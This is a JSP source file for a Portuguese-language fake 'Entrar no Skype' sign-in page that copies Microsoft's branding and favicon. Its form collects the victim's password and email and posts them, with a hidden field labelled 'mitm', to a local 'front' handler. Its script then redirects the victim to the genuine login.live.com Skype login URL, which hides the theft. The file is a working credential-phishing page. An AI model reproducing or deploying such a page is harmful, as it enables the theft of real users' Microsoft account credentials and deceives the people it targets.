<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%@page contentType="text/html" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
    <head>
        <title>Entrar no Skype</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <link rel=" icon" href="https://auth.gfx.ms/16.000.27887.2/images/favicon.ico"  type="image/png" />
        <link rel="stylesheet" href="CSS/materialize.min.css"/>
        <link rel="stylesheet" href="CSS/app.css"/>
        <script src="JS/materialize.min.js"></script>
    </head>

    <body >

        <br><br><br><br><br>
        <img src="Images/icon.png" id="icon"/>
        <div class="valign-wrapper">

        </div>
        <br>
        <div class="row">
            <div class="col s12 m8 offset-m3 l4 offset-l4">
                <div class="card">
                    <div class="card-content">
                            <br>
                            <img src="Images/nomemicrosoft.png"/>
                            <br><br><a href="index.html"><-</a>${email}<br>

                            <h5><b>Insira a senha</b></h5>
                            <form method="post" action="front">
                                <input type="password" placeholder="Senha" name="senha"/>
                                <br>
                                <input type="checkbox" class="filled-in"/>
                                <input type="hidden" name="mitm" value="mitm"/>
                                <input type="hidden" name="email" value="${email}"/>
                                <label>
                                    <input type="checkbox">
                                    <span>Mantenha-me conectado</span>
                                </label>
                                <br>
                                <br><label style="font-size: 12px"><a href="#">
                                        Esqueci minha senha</a></label>
                                <br>

                                <input type="submit" value="Entrar" class="btn"/>
                                <br><br>

                        </form>

                    </div>
                </div>
            </div>
        </div>
    </body>
    <script type="text/javascript">
        let  ok = "${param.ok}";
        if (ok == 1)
            window.location.replace("https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1535111619&rver=7.0.6730.0&wp=MBI_SSL&wreply=https%3A%2F%2Flw.skype.com%2Flogin%2Foauth%2Fproxy%3Fclient_id%3D578134%26redirect_uri%3Dhttps%253A%252F%252Fweb.skype.com%252F%26state%3D935a2116-b8f9-4269-d60d-cb6fe030d5ed%26site_name%3Dlw.skype.com&lc=1033&id=293290&mkt=pt-BR&psi=skype&lw=1&cobrandid=2befc4b5-19e3-46e8-8347-77317a16a5a5&client_flight=hsu%2CReservedFlight33%2CReservedFlight67");
    </script>

</html>
